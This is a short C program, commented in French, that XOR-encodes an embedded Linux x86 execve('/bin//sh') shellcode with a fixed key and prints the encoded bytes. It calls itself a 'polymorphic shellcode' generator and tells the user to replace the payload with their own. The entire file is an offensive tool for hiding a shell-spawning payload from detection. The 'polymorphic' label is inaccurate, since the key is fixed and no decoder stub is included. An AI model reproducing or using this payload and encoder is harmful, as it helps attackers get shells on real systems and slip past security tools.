#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void polymorphic_shellcode(unsigned char *shellcode, int length) {
    for (int i = 0; i < length; i++) {
        shellcode[i] ^= 0xAA; // Chiffrement XOR simple
    }
}

int main() {
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode

    polymorphic_shellcode(shellcode, sizeof(shellcode) - 1);

    printf("Polymorphic shellcode generated:\n");
    for (int i = 0; i < sizeof(shellcode) - 1; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    return 0;
}